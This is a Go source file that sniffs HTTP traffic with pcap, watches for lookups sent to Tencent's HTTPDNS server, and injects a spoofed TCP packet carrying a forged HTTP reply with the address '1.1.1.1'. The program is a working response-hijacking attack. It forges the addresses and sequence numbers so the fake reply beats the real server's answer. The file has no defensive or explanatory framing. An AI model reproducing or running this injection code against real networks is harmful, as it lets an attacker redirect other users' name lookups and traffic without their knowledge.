package main

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"
)

var (
	device       string = "en0"
	snapshot_len int32  = 1024
	promiscuous  bool   = false
	err          error
	timeout      time.Duration = 30 * time.Second
	handle       *pcap.Handle
	tencentip	 string = "119.29.29.29"
	tencentregex string = `^/d\?dn=([\S]+)`
	tencentregexC *regexp.Regexp
	aliip		 string = "203.107.1.33"
)


func main() {
	//FindDevice()
	// Open device
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {log.Fatal(err) }
	defer handle.Close()

	// Set filter
	var filter string = "tcp and dst port 80"
	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Only capturing TCP dst port 80 packets.")


	// Use the handle as a packet source to process all packets
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	tencentregexC = regexp.MustCompile(tencentregex)


	for packet := range packetSource.Packets() {
		// Process packet here
		//fmt.Println(packet)
		dPacket(packet, handle)
	}
}

func FindDevice(){
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}
	// Print device information
	for _, device := range devices {
		for _, address := range device.Addresses {
			fmt.Println("- IP address: ", address.IP)
			fmt.Println("- Subnet mask: ", address.Netmask)
		}
	}
}


func Payload(packet gopacket.Packet){
	// When iterating through packet.Layers() above,
	// if it lists Payload layer then that is the same as
	// this applicationLayer. applicationLayer contains the payload
	applicationLayer := packet.ApplicationLayer()
	if applicationLayer != nil {
		fmt.Println("Application layer/Payload found.")
		//fmt.Printf("%s\n", applicationLayer.Payload())

		tcp := packet.TransportLayer().(*layers.TCP)

		reader := bufio.NewReader(bytes.NewReader(tcp.Payload))
		httpReq, err := http.ReadRequest(reader)
		// Search for a string inside the payload
		if(err != nil){
			fmt.Print(err)
		}else{
			fmt.Printf("%s\n", httpReq.RequestURI)
		}
		if strings.Contains(string(applicationLayer.Payload()), "HTTP") {
			fmt.Println("HTTP found!")
		}
	}
}

func dPacket(packet gopacket.Packet, handler *pcap.Handle){
	if packet.NetworkLayer() == nil || packet.TransportLayer() == nil || packet.TransportLayer().LayerType() != layers.LayerTypeTCP {
		return
	}

	tcp := packet.TransportLayer().(*layers.TCP)
	reader := bufio.NewReader(bytes.NewReader(tcp.Payload))
	httpReq, err := http.ReadRequest(reader)
	// Search for a string inside the payload
	if(err != nil){
		return
	}

	if httpReq.Host == tencentip {

		//_, dname := tencentregexC.FindStringSubmatch(httpReq.RequestURI)
		match := tencentregexC.FindStringSubmatch(httpReq.RequestURI)
		if len(match) < 2 {
			return
		}
		fmt.Printf("%s\n", match[1])
		//fmt.Printf("%q\n", tencentregexC.FindStringSubmatch(httpReq.RequestURI))

		ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
		ethernetPacket, _ := ethernetLayer.(*layers.Ethernet)

		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		ip, _ := ipLayer.(*layers.IPv4)

		tcpLayer := packet.Layer(layers.LayerTypeTCP)
		tcp, _ := tcpLayer.(*layers.TCP)

		data := string(tcpLayer.(*layers.TCP).LayerPayload())

		NethernetLayer := &layers.Ethernet{
			SrcMAC: ethernetPacket.DstMAC,
			DstMAC: ethernetPacket.SrcMAC,
			EthernetType: layers.EthernetTypeIPv4,
		}

		NipLayer := &layers.IPv4{
			SrcIP: ip.DstIP,
			DstIP: ip.SrcIP,
			Version: ip.Version,
			TTL: 77,
			Id: ip.Id,
			Protocol: layers.IPProtocolTCP,
		}

		NtcpLayer := &layers.TCP{
			SrcPort: tcp.DstPort,
			DstPort: tcp.SrcPort,
			Ack: tcp.Seq  + uint32(len(data)),
			Seq: tcp.Ack,
			PSH: true,
			ACK: true,
			FIN: true,
			Window: 0,
		}

		NtcpLayer.SetNetworkLayerForChecksum(NipLayer)

		buffer := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}
		rawString := "HTTP/1.1 200 OK\r\nServer: Http Server\r\nContent-Type: text/html\r\nContent-Length: 7\r\n\r\n"
		rawString += "1.1.1.1"

		gopacket.SerializeLayers(buffer, opts,
			NethernetLayer,
			NipLayer,
			NtcpLayer,
			gopacket.Payload([]byte(rawString)),
		)

		outgoingPacket := buffer.Bytes()
		// Send our packet
		err = handler.WritePacketData(outgoingPacket)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("I sent Response-hijack packet!")
	}


}